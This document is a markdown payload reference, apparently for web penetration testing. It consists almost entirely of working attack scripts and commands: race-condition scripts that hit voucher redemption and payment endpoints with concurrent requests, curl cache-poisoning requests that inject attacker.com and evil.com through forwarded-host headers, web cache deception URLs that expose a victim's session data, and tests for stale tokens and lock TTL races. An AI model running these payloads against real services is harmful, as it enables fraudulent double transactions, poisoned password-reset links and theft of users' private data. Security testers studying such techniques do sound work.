# Attack Payloads: Concurrency & Distributed Vulnerabilities

## Race Condition — Concurrent Request Scripts

### Python threading — parallel balance deduction
```python
#!/usr/bin/env python3
"""
Race condition PoC: send N concurrent identical requests to exploit a non-atomic operation.
Usage: python3 race_condition.py --url https://target.com/api/redeem --token TOKEN --count 50
"""
import threading, requests, argparse, time
from collections import Counter

parser = argparse.ArgumentParser()
parser.add_argument('--url', required=True)
parser.add_argument('--token', required=True)
parser.add_argument('--count', type=int, default=50, help='Number of concurrent requests')
parser.add_argument('--body', default='{}', help='JSON request body')
args = parser.parse_args()

results = []
lock = threading.Lock()

def send_request():
    try:
        r = requests.post(
            args.url,
            json=args.body if isinstance(args.body, dict) else __import__('json').loads(args.body),
            headers={
                'Authorization': f'Bearer {args.token}',
                'Content-Type': 'application/json',
            },
            timeout=10
        )
        with lock:
            results.append(r.status_code)
    except Exception as e:
        with lock:
            results.append(f"ERROR:{e}")

# Pre-create all threads
threads = [threading.Thread(target=send_request) for _ in range(args.count)]

# Launch all simultaneously (minimize timing jitter)
start = time.perf_counter()
for t in threads:
    t.start()
for t in threads:
    t.join()
elapsed = time.perf_counter() - start

print(f"\nResults ({args.count} concurrent requests, {elapsed:.2f}s):")
counts = Counter(results)
for status, count in sorted(counts.items()):
    print(f"  HTTP {status}: {count} responses")

# Interpretation:
# If 200: 1, 40x: 49 → proper atomic guard
# If 200: 48, 40x: 2 → RACE CONDITION — multiple operations succeeded
```

### Burp Suite Turbo Intruder script (for Burp extension)
```python
# Paste this into Turbo Intruder's script editor
# Sends all requests in a single TCP connection burst (last-byte sync)

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=1,
        pipeline=False,
        engine=Engine.BURP2
    )
    # Send 50 identical requests simultaneously
    for i in range(50):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if '200' in req.response or 'success' in req.response.lower():
        table.add(req)
```

### HTTP/2 single-packet attack (most precise, minimizes network jitter)
```python
#!/usr/bin/env python3
"""
HTTP/2 race condition using single-packet technique.
All requests arrive in the same TCP packet — server processes simultaneously.
Requires httpx with HTTP/2 support: pip install httpx[http2]
"""
import httpx, asyncio

async def race_condition_h2(url: str, token: str, num_requests: int = 20):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    body = '{"action": "redeem_voucher", "code": "PROMO50"}'

    async with httpx.AsyncClient(http2=True) as client:
        # Warm up the connection
        await client.get(url.rsplit('/', 1)[0], headers=headers)

        # Send all requests simultaneously via HTTP/2 multiplexing
        tasks = [
            client.post(url, content=body, headers=headers)
            for _ in range(num_requests)
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

    successes = [r for r in responses if isinstance(r, httpx.Response) and r.status_code == 200]
    print(f"Successful responses: {len(successes)}/{num_requests}")
    if len(successes) > 1:
        print("[RACE CONDITION] Multiple concurrent requests succeeded!")
        for r in successes[:3]:
            print(f"  Response: {r.text[:200]}")

asyncio.run(race_condition_h2("https://TARGET.COM/api/redeem", "TOKEN"))
```

## Cache Poisoning Headers

### X-Forwarded-Host poisoning
```bash
# Poison the cache with attacker's hostname
curl -s "https://TARGET.COM/api/reset-password" \
    -H "X-Forwarded-Host: attacker.com" \
    -H "Accept: text/html" \
    -w "\nX-Cache: %header{x-cache}\n"

# Look for attacker.com in response links/content
# If cached: subsequent users requesting same URL get poisoned response
# Password reset link in email points to attacker.com
```

### Host header injection for cache poisoning
```bash
# Step 1: Send poison request
curl -s "https://TARGET.COM/page" \
    -H "Host: TARGET.COM" \
    -H "X-Forwarded-Host: evil.com" \
    -H "X-Host: evil.com" \
    -H "X-Forwarded-Server: evil.com" \
    > poison_response.html

# Check if evil.com appears in response body (link generation)
grep "evil.com" poison_response.html

# Step 2: Verify poison is cached (send request without header)
curl -s "https://TARGET.COM/page" | grep "evil.com"
# If yes: cache poisoned — other users get evil.com links
```

### Web cache deception — private data cached as public
```bash
# Trick cache into storing authenticated user's profile as a cacheable CSS/JS file
# Requires: cache rules based on file extension, application serves page regardless of extension

# Step 1: Log in as victim and visit the deception URL
curl -s "https://TARGET.COM/profile/..%2Fstyle.css" \
    -H "Cookie: session=VICTIM_SESSION" \
    -w "\nX-Cache-Status: %header{x-cache-status}\n"

# Step 2: Access the same URL without authentication
curl -s "https://TARGET.COM/profile/..%2Fstyle.css" | grep -i "email\|phone\|address\|token"
# If victim's profile data returned without auth → web cache deception confirmed

# Other deception URLs to try:
DECEPTION_PATHS=(
    "/profile/nonexistent.css"
    "/account/x.js"
    "/settings/y.png"
    "/dashboard/..%2Fstyle.css"
    "/api/users/me%3F.css"
)
```

## Stale Auth Test

```bash
# Step 1: Log in and get token
TOKEN=$(curl -s -X POST "https://TARGET.COM/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"user@test.com","password":"password"}' \
    | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"

# Step 2: Verify token works
curl "https://TARGET.COM/api/users/me" -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Step 3: Revoke token (logout, admin revokes, role change)
curl -X POST "https://TARGET.COM/api/auth/logout" -H "Authorization: Bearer $TOKEN"
# OR: admin revokes from admin panel, OR: trigger role downgrade

# Step 4: Immediately use the revoked token
TIME_START=$(date +%s%N)
RESP=$(curl -s -w "\nHTTP:%{http_code}" "https://TARGET.COM/api/users/me" \
    -H "Authorization: Bearer $TOKEN")
TIME_END=$(date +%s%N)
ELAPSED=$(( (TIME_END - TIME_START) / 1000000 ))
echo "Response ($ELAPSED ms): $RESP"

# Step 5: Repeat every 5 seconds until token stops working
for i in $(seq 1 60); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://TARGET.COM/api/users/me" -H "Authorization: Bearer $TOKEN")
    echo "$(date): $STATUS"
    [ "$STATUS" = "401" ] && echo "Token invalidated at $((i * 5))s" && break
    sleep 5
done
```

## Distributed Lock TTL Race

```python
#!/usr/bin/env python3
"""Test if distributed lock TTL is shorter than operation duration."""
import requests, threading, time

TARGET = "https://TARGET.COM/api/payment/process"
TOKEN = "USER_TOKEN"
PAYMENT_BODY = {"amount": 100, "currency": "USD", "method": "credit_card"}

successes = []

def process_payment(attempt_num):
    """Send payment request and record if it succeeds."""
    r = requests.post(TARGET,
        json=PAYMENT_BODY,
        headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"},
        timeout=15
    )
    if r.status_code == 200:
        successes.append((attempt_num, r.json()))
        print(f"[{attempt_num}] SUCCESS: {r.json()}")
    else:
        print(f"[{attempt_num}] Blocked: HTTP {r.status_code}")

# Send first request, then after lock TTL expires, send another
t1 = threading.Thread(target=process_payment, args=(1,))
t1.start()

# Wait for suspected TTL (e.g., 1 second) then send concurrent request
time.sleep(1.1)
t2 = threading.Thread(target=process_payment, args=(2,))
t2.start()

t1.join()
t2.join()

if len(successes) > 1:
    print(f"\n[RACE] {len(successes)} payments succeeded — lock TTL too short!")
```
